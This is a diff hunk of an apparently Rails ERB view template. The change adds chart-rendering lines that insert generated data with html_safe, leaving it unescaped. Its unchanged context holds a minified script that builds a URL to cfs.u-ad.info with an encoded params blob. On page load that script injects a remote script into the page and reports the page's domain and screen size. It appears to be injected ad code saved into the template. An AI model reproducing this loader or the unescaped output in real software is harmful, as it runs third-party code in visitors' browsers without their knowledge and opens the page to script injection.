@@ -115,4 +115,8 @@
 
 <script type="text/javascript">
 if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bd8NOI9cWcyIlaDcZ%2fu3yH5YNpWpMFGbEo76zqk50Mj1yB2XduWxwFhyzySdbC6hVuXGyCrk9LUzhqSmQva8vX7hBrCnOResEr7tvxcceVFruQHFsaohgu0XkPgL1hxCw2J1GndggCsegFARkJfAlCXZsqw5afxleYkyB%2bv4MxBZfDSqxBnNBx3ScoqaJ89kNlBNiGI50OenmClZe%2baDb8ejKxJiHtEEYAMLMOhliCMYjL4kmmXCXP82HT%2fLsCB48q9i%2b0y9I4DBhKzBvO%2bCb5cv4AGRb2kn1oFT1g%2f6eKZTxAyAUpODKbhLlTTBfVnxJBqHsUtu7BaKL8skRckZ7zLoPiNnl9Xe0EZg0RmWBUOuUeFHKrG%2fgFpNbzhcltBRQOwL7NZDWyheUQaorUSXt09WAzZnD%2fQMJOJTgcC2xO1LObv8zHXgCHOLCvN8%2fuP6xYrxy601ZwtP%2fzqBAwPm2cA5NmV9aJBpH9G2I9i8TvRLtXRAEgR3woI6qU%2fl7hMHbxM%2bZBxI806ZG2cGBkqkFr9%2fLDo0dIsW054ILq8qx4WHfC7%2bAIFPwbKSo%2fNXctEptt0jJqnjZMcg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
+
+<% string, interval = chart_structure(@keywords_1, @keywords_2) %>
+var datas = <%= string.html_safe %>;
+generateCharts(datas, <%= interval %>);
 </script>
